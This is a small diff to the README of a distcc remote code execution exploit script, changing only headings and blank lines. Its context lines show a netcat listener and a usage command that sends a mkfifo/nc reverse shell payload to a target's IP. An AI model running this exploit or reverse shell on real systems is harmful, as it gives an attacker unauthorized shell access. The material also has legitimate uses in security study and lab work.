@@ -47,11 +47,9 @@ nc -lvnp 4444
 ### Run the exploit:
 python3 distcc_rce.py <target_ip> "rm -f /tmp/f; mkfifo /tmp/f; /bin/sh -i < /tmp/f 2>&1 | nc <your_ip> 4444 > /tmp/f"
 
-## Note:
+## Notes:
 - When spawning a reverse shell, the script may not return output.
 - This is expected, as the shell keeps the connection open.
-
-## Notes:
 - Commands are executed as the daemon user
 - Privilege escalation is required to obtain root access
 - Modern systems are not affected
@@ -69,7 +67,9 @@ python3 distcc_rce.py <target_ip> "rm -f /tmp/f; mkfifo /tmp/f; /bin/sh -i < /tm
 - The author is not responsible for misuse or damage caused by this code.
 
 ## Author
+
 Danilo Barreto
+
 GitHub: https://github.com/danilo-sec
 
 ## Focus areas:
